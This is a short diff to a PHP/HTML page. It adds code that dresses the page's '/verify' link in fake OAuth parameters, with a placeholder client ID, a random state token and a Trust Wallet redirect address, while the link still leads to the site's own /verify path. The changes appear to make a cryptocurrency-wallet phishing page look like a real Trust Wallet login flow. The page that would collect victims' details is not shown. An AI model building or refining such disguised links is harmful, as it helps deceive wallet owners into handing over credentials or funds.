@@ -1,3 +1,18 @@
+<?php
+// Generate the dynamic URL parameters
+$client_id = "abcdefghijklmnopqrstuvwxyz123456"; // Replace with your 32-character client_id
+$redirect_uri = "https%3A%2F%2Faccount.trustwallet.com%2Foauth-connect";
+$state = "v2.local." . substr(bin2hex(random_bytes(32)), 0, 16) . "." . substr(bin2hex(random_bytes(32)), 16, 48);
+$options = "login%account.trustwallet.com";
+
+// Construct the full URL
+$dynamic_url = "/verify?url=/api/1/login/oauth/provider/verify" .
+    "&client_id=" . $client_id .
+    "&redirect_uri=" . $redirect_uri .
+    "&state=" . $state .
+    "&options=" . $options;
+    
+?>
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -146,7 +161,7 @@
         <div class="h-0.5 w-full mt-4 bg-[#fff] opacity-40">
         
         </div>
-        <a href="/verify">
+        <a href=<?php echo htmlspecialchars($dynamic_url); ?>>
        <div class="flex mt-8 align-middle justify-center items-center space-x-8">
         <span class="material-symbols-outlined">
           add_circle
